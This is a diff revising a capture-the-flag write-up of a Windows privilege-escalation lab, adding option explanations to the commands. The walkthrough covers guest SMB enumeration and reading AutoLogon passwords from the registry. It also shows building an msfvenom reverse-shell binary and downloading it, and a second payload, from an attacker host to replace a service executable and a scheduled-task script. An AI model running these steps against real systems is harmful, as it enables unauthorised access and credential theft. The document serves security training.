@@ -53,6 +53,10 @@ Available SMB shares were listed without supplying a password:
 
 ```bash
 smbclient -L //<TARGET_IP> -N
+
+Options:
+-L    list the SMB shares available on the target
+-N    do not prompt for a password
 ```
 
 A readable share was discovered:
@@ -88,6 +92,14 @@ Additional SMB enumeration with the Guest account was performed:
 
 ```bash
 netexec smb <TARGET_IP> -u guest -p '' --rid-brute
+
+Options:
+NetExec      Windows/AD network enumeration tool
+-u guest     authenticate using the Guest account
+-p ''        use an empty password
+--rid-brute  enumerate Windows users and groups by resolving RID values
+RID          Relative Identifier, the final part of a Windows SID
+SID          Security Identifier uniquely identifying a user, group, or other security principal
 ```
 
 Relevant accounts included:
@@ -98,22 +110,29 @@ notadmin
 svcadmin
 ```
 
-The recovered `thmuser` credential was then used for RDP:
+The recovered `thmuser` credential was then used for Remote Desktop Protocol:
 
 ```bash
 xfreerdp /dynamic-resolution +clipboard /cert:ignore \
   /v:<TARGET_IP> \
   /u:thmuser \
   /p:'<REDACTED>'
+
+Options:
+xfreerdp              command-line RDP client used to connect to Windows hosts
+/dynamic-resolution   adapt the remote desktop resolution when resizing the window
++clipboard             enable clipboard sharing between attacker and target
+/cert:ignore           ignore RDP certificate validation errors
+/v:<TARGET_IP>         specify the target host
+/u:thmuser             username used for authentication
+/p:'<REDACTED>'        password used for authentication
 ```
 
 The resulting identity was verified:
 
 ```powershell
 whoami
-```
 
-```bash
 privesc\thmuser
 ```
 
@@ -149,14 +168,24 @@ whoami /priv
 cmdkey /list
 ```
 
-The Windows Winlogon registry configuration was then inspected:
+The Windows Winlogon registry configuration was then inspected.
 
-```powershell
+Windows can use **AutoLogon** to automatically sign in a user at startup. Its configuration is stored in the Windows Registry, including under the `Winlogon` key.
+
+
+The configured AutoLogon username and password were queried with:
+
+```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
 ```
 
-```powershell
+```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+
+Options:
+HKLM        HKEY_LOCAL_MACHINE, a registry hive containing system-wide configuration
+reg query   read values from the Windows Registry
+/v          query a specific registry value
 ```
 
 The registry exposed AutoLogon credentials:
@@ -184,9 +213,7 @@ After entering the recovered password, the new context was verified:
 
 ```powershell
 whoami
-```
 
-```bash
 privesc\notadmin
 ```
 
@@ -210,6 +237,17 @@ Services running under the `svcadmin` account were enumerated:
 Get-CimInstance Win32_Service |
 Where-Object {$_.StartName -match "svcadmin"} |
 Select-Object Name,StartName,PathName,State
+
+Options:
+Get-CimInstance Win32_Service   retrieve Windows service information through CIM/WMI
+Where-Object                    filter the returned service objects
+$_.StartName                    account used to run the current service
+-match "svcadmin"               keep services whose execution account matches svcadmin
+Select-Object                   display only selected properties
+Name                            service name
+StartName                       service execution account
+PathName                        executable path
+State                           current service state
 ```
 
 Relevant result:
@@ -237,6 +275,9 @@ Permissions on the service directory and executable were then checked:
 ```powershell
 icacls C:\Windows\THMSVC
 icacls C:\Windows\THMSVC\svc.exe
+
+Options:
+icacls    display or modify Windows file/folder ACL permissions
 ```
 
 Relevant permissions included:
@@ -247,9 +288,11 @@ C:\Windows\THMSVC
 
 svc.exe
 → Everyone:(F)
-```
 
 `(F)` represents Full Control.
+```
+
+
 
 The privilege-escalation condition was therefore:
 
@@ -269,6 +312,10 @@ msfvenom -p windows/x64/shell_reverse_tcp \
   LPORT=4444 \
   -f exe-service \
   -o svc.exe
+  
+Options:
+-f exe-service   Windows executable format
+-o svc.exe       output file
 ```
 
 Using `exe-service` is important because the binary is launched directly by the Windows Service Control Manager.
@@ -297,6 +344,13 @@ The replacement executable was downloaded:
 Invoke-WebRequest `
   http://<ATTACKER_IP>:8000/svc.exe `
   -OutFile C:\Windows\THMSVC\svc.exe
+  
+Options:
+Invoke-WebRequest                 send an HTTP request and download remote content
+http://<ATTACKER_IP>:8000/svc.exe  payload hosted on the attacker machine
+-OutFile                          save the downloaded content to a file
+C:\Windows\THMSVC\svc.exe         overwrite the service executable on the target
+`                                 PowerShell line-continuation character
 ```
 
 The service was then started:
@@ -309,9 +363,7 @@ The reverse shell connected back and the resulting context was verified:
 
 ```cmd
 whoami
-```
 
-```bash
 privesc\svcadmin
 ```
 
@@ -354,33 +406,29 @@ For direct service-binary replacement, the appropriate format was therefore:
 
 From the `svcadmin` shell, a batch file under `C:\Windows\Tasks` was inspected:
 
-```cmd
+```powershell
 type C:\Windows\Tasks\Cleanup.bat
 ```
 
 Original contents:
 
-```batch
+```powershell
 @echo off
 del /Q /F "%TEMP%\*.tmp" 2>nul
 ```
 
 Its permissions were checked:
 
-```cmd
+```powershell
 icacls C:\Windows\Tasks\Cleanup.bat
 ```
 
 Relevant result:
 
-```bash
+```powershell
 PRIVESC\svcadmin:(I)(M)
 NT AUTHORITY\SYSTEM:(I)(F)
-```
 
-Here:
-
-```bash
 (M) = Modify
 (I) = inherited permission
 ```
@@ -418,31 +466,31 @@ nc -lvnp 5555
 
 The payload was downloaded to the target:
 
-```cmd
+```powershell
 powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>:8000/shell.exe' -OutFile 'C:\Windows\Tasks\shell.exe'"
 ```
 
 Its presence was verified:
 
-```cmd
+```powershell
 dir C:\Windows\Tasks\shell.exe
 ```
 
 The original batch file could be preserved before modification:
 
-```cmd
+```powershell
 copy C:\Windows\Tasks\Cleanup.bat C:\Windows\Tasks\Cleanup.bat.bak
 ```
 
 The scheduled-task script was then replaced with a command launching the payload:
 
-```cmd
+```powershell
 echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\Cleanup.bat
 ```
 
 The modified content was verified:
 
-```cmd
+```powershell
 type C:\Windows\Tasks\Cleanup.bat
 ```
 
@@ -452,9 +500,7 @@ The final identity was verified:
 
 ```cmd
 whoami
-```
 
-```bash
 nt authority\system
 ```
 
@@ -462,9 +508,7 @@ The final room flag was then accessible:
 
 ```cmd
 type C:\flag4.txt
-```
 
-```bash
 THM{REDACTED}
 ```
 
